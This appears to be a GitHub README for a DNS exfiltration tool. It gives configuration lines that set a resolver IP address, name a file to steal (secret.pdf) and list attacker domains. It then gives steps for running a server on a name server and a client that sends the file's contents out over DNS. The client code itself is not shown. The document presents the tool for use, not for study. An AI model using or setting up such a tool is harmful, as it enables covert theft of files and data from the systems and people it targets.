# DNS-Exfiltration
Mudik DNS Exfiltration</br>
![image](https://github.com/spatronn/DNS-Exfiltration/assets/27374567/98b43ade-ae4b-4e0f-83cd-d5c48c7e76eb)



<b>Change the parameter according to your environment:</b></br>
//Enter your DNS Resolver (client.py)</br>
dns_server = "3.253.51.115"</br>
//Specify the file you want to exfiltrate instead of secret.pdf (client.py)</br>
with open("secret.pdf", "rb") as pdf_file:</br>
//Define the domain or domains you will use in DNS Exfiltration. (client.py)</br>
domain_list = ["dnsmalwaredaddy.online","laleler-denemeler.top"]</br>


STEP-1</br>
Install requirements</br>
STEP-2</br>
Run server.py on your name server.Make sure that the DNS service is not running on this server.</br>
STEP-3</br>
Modified client.py according to your environment.</br>
STEP-4</br>
Run client.py</br>
